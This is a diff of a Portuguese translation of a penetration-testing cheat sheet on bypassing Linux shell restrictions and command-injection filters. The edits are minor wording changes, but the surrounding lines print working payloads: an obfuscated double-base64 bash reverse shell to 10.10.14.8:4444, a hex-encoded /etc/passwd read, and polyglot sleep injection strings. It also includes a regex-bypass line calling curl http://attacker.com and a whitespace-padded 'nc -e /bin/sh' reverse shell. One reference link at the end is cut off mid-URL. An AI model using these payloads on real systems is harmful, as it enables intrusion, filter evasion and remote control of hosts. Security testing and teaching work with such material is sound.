@@ -4,13 +4,13 @@
 
 ## Bypasses de Limitações Comuns
 
-### Reverse Shell
+### Shell Reversa
 ```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### Rev shell curto
+### Shell Rev curta
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -133,14 +133,14 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-### Obtendo caracteres de Variáveis de Ambiente
+### Obtendo caracteres de variáveis de ambiente
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
 ### Exfiltração de dados DNS
 
-Você pode usar **burpcollab** ou [**pingb**](http://pingb.in) por exemplo.
+Você pode usar **burpcollab** ou [**pingb**](http://pingb.in) como exemplo.
 
 ### Builtins
 
@@ -202,7 +202,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Bypass potencial regexes
+### Bypass de regexes potenciais
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -298,11 +298,13 @@ ln /f*
 
 Se você estiver dentro de um sistema de arquivos com as **proteções de somente leitura e noexec** ou até mesmo em um contêiner distroless, ainda há maneiras de **executar binários arbitrários, até mesmo um shell!:**
 
+
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
 ## Bypass de Chroot e outras Jails
+
 
 {{#ref}}
 ../privilege-escalation/escaping-from-limited-bash.md
@@ -310,7 +312,7 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## NOP Sled Baseado em Espaço ("Bashsledding")
 
-Quando uma vulnerabilidade permite que você controle parcialmente um argumento que, em última análise, chega a `system()` ou outro shell, você pode não saber o deslocamento exato em que a execução começa a ler sua carga útil. Sleds NOP tradicionais (por exemplo, `\x90`) **não** funcionam na sintaxe do shell, mas o Bash ignorará inofensivamente espaços em branco à frente antes de executar um comando.
+Quando uma vulnerabilidade permite que você controle parcialmente um argumento que, em última instância, chega a `system()` ou outro shell, você pode não saber o deslocamento exato em que a execução começa a ler sua carga útil. Sleds NOP tradicionais (por exemplo, `\x90`) **não** funcionam na sintaxe do shell, mas o Bash ignorará inofensivamente espaços em branco à frente antes de executar um comando.
 
 Portanto, você pode criar um *NOP sled para Bash* prefixando seu comando real com uma longa sequência de espaços ou caracteres de tabulação:
 ```bash
@@ -318,7 +320,7 @@ Portanto, você pode criar um *NOP sled para Bash* prefixando seu comando real c
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-Se uma cadeia ROP (ou qualquer primitiva de corrupção de memória) pousar o ponteiro de instrução em qualquer lugar dentro do bloco de espaço, o parser do Bash simplesmente ignora os espaços em branco até alcançar `nc`, executando seu comando de forma confiável.
+Se uma cadeia ROP (ou qualquer primitiva de corrupção de memória) pousar o ponteiro de instrução em qualquer lugar dentro do bloco de espaço, o analisador Bash simplesmente ignora os espaços em branco até alcançar `nc`, executando seu comando de forma confiável.
 
 Casos de uso práticos:
 
@@ -333,7 +335,7 @@ Casos de uso práticos:
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju)
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
 
 - [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
